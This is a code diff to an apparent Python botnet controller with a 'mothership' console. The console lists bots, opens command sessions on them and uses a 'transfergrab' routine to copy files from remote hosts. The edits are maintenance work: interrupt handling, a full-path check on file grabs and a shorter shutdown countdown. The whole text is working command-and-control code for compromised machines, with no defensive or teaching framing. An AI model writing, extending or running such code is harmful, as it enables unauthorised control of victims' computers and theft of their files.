@@ -47,7 +47,11 @@ def session(conn):
 	print ("\n")
 
 	while True:
-		command=input("client>")
+		try:
+			command=input("client>")
+		except KeyboardInterrupt:
+			quitsafely()
+
 		if 'exit' in command:
 			print ("\n BACK TO MOTHERSHIP \n")
 			return
@@ -190,35 +194,36 @@ def remove(connection):
 
 
 def mothership():
-    global flag
-    while True:
-        command=input("<mothership>")
-      
+	global flag
+	while True:
+		try:
+			command=input("<MotherNode>")
+		except KeyboardInterrupt:
+			quitsafely()
 
-        if 'showbots' in command:
-            x=showbots()
-            while x != 0:
-                x=showbots()
+		if 'showbots' in command:
+			x=showbots()
+			while x != 0:
+ 				x=showbots()
 
 
-        elif "connect" in command:
-            a,b=command.split(" ")
-            b=int(b)
-            if b<len(list_of_clientaddr):
-                session(list_of_clientsocket[b])
-            else:
-                print(Fore.RED)
-                print("[-]index out of range TRY AGAIN (indexing starts from 0)")
-                print(Style.RESET_ALL)
+		elif "connect" in command:
+			a,b=command.split(" ")
+			b=int(b)
+			if b<len(list_of_clientaddr):
+				session(list_of_clientsocket[b])
+			else:
+				print(Fore.RED)
+				print("[-]index out of range TRY AGAIN (indexing starts from 0)")
+				print(Style.RESET_ALL)
 
-        elif "exit" in command:
+		elif "exit" in command:
+			quitsafely()
+		elif "help" in command:
+			helpmothership()
 
-            quitsafely()
-        elif "help" in command:
-            helpmothership()
-
-        else:
-            print("INVALID COMMAND PRESS HELP FOR MORE INFO")
+		else:
+			print("INVALID COMMAND PRESS HELP FOR MORE INFO")
 
 def showbots():
 
@@ -289,36 +294,42 @@ def botconnect():
 
 
 def transfergrab(conn,command):
-	conn.send(command.encode())
 	grab,path=command.split('*')
-	fpath=os.getcwd()+"/"
-	fpath += os.path.basename(path)
-	bits=conn.recv(1024).decode()
-	if "The File Doesn't Exist" in bits:
-		print(Fore.RED)
-		print("[-]The File Doesn't Exist")   
-		print(Style.RESET_ALL)
-	elif "DIR" in bits:
-		print(Fore.YELLOW)
-		print("[-]Cannot grab a Directory")
-		print(Style.RESET_ALL)
-	elif "ERROR" in bits:
-		print(Fore.RED)
-		print("[-]Some error occured at remote host")
-		print(Style.RESET_ALL)
+	if not path.startswith("/"):
+                                print(Fore.YELLOW)
+                                print("[-] Please specify the complete path")
+                                print(Style.RESET_ALL)
 
 	else:
-		f=open(fpath,'w')
-		while True:
-				f.write(bits)
-				bits=conn.recv(1024).decode()
-				if bits.endswith("DONE"):
-					f.write(bits.strip("DONE"))
-					print(Fore.GREEN)
-					print("[+]File Transfer Complete and saved at CWD")   
-					print(Style.RESET_ALL)
-					f.close()
-					break
+		conn.send(command.encode())
+		fpath=os.getcwd()+"/"
+		fpath += os.path.basename(path)
+		bits=conn.recv(1024).decode()
+		if "The File Doesn't Exist" in bits:
+			print(Fore.RED)
+			print("[-]The File Doesn't Exist")   
+			print(Style.RESET_ALL)
+		elif "DIR" in bits:
+			print(Fore.YELLOW)
+			print("[-]Cannot grab a Directory")
+			print(Style.RESET_ALL)
+		elif "ERROR" in bits:
+			print(Fore.RED)
+			print("[-]Some error occured at remote host")
+			print(Style.RESET_ALL)
+
+		else:
+			f=open(fpath,'w')
+			while True:
+					f.write(bits)
+					bits=conn.recv(1024).decode()
+					if bits.endswith("DONE"):
+						f.write(bits.strip("DONE"))
+						print(Fore.GREEN)
+						print("[+]File Transfer Complete and saved at CWD")   
+						print(Style.RESET_ALL)
+						f.close()
+						break
 
 
 
@@ -374,7 +385,7 @@ def quitsafely():
         print(Fore.GREEN)
         print("\n --------------------------------------------------------------------------")
         print("ALL BOTS ARE SLEEPING IT IS SAFE TO QUIT/EXIT NOW.")
-        print("EXITING IN 10 SECONDS")
+        print("EXITING IN 5 SECONDS")
         print(" --------------------------------------------------------------------------")
         print(Style.RESET_ALL)
         
@@ -382,7 +393,7 @@ def quitsafely():
         s.connect((str(sys.argv[1]),int(sys.argv[2])))
         
         print(Fore.RED)
-        for remaining in range(10, 0, -1):
+        for remaining in range(5, 0, -1):
             sys.stdout.write("\r")
             sys.stdout.write("{:2d} seconds remaining.".format(remaining)) 
             sys.stdout.flush()
